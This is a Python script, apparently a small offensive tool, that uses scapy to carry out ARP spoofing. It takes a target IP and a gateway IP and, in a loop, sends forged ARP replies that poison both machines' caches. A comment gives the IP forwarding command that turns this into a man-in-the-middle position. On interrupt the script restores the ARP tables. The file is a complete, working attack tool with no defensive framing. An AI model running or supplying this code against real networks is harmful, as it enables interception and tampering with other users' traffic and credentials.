#!/usr/bin/python

"""
This is a simple arp spoofing program.
More info: https://en.wikipedia.org/wiki/Address_Resolution_Protocol
"""

# packet forwarding
# echo 1 > /proc/sys/net/ipv4/ip_forward
import re
import argparse
import time
import scapy.all as scapy

# TODO:
#       - example usage
#       - require sudo
#       - verbosity argument
#       - make arguments manadatory

# IP Regular Expression
ip_regex = re.compile(r"""
         ((25[0-5]|2[0-4][0-9]|[1-9][0-9]|1[0-9]{2}|[0-9])\.){3}
         (25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9][0-9]|[0-9])
         """, re.VERBOSE)


def get_arguments():
    """ This function parses and returns the arguments provided. """
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway",
                        dest="gateway_ip",
                        help="Gateway Ip"
                        )
    parser.add_argument("-t", "--target",
                        dest="target_ip",
                        help="Target Ip."
                        )
    args = parser.parse_args()
    gw_re = re.match(ip_regex, str(args.gateway_ip))
    tr_re = re.match(ip_regex, str(args.target_ip))
    if not gw_re:
        parser.error("Gateway ip ( " +
                     str(args.gateway_ip) +
                     " ) is not valid.")
    elif not tr_re:
        parser.error("Target ip ( " +
                     str(args.target_ip) +
                     " ) is not valid.")
    else:
        return (args.target_ip, args.gateway_ip)


def get_mac(ip):
    """ This function scans the given ip address
                and returns its mac address. """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1,
                              verbose=False
                              )[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """ This function sends an ARP packet to target ip. """
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """ This function sends an ARP packet to destination ip
        so we can restore it to its initial state. """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,
                       pdst=destination_ip,
                       hwdst=destination_mac,
                       psrc=source_ip,
                       hwsrc=source_mac
                       )
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    # Get the arguments (ips)
    (target_ip, gateway_ip) = get_arguments()
    try:
        send_packets_count = 0
        while True:
            # Spoof the client
            spoof(target_ip, gateway_ip)
            # Spoof the router
            spoof(gateway_ip, target_ip)
            send_packets_count += 2
            print("\r[+] Packets sent: " + str(send_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        # Restore arp tables when the program stops
        print("\n[-] Keyboard Interrupt...")
        print("[-] Reseting ARP tables...")
        print("[-] Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
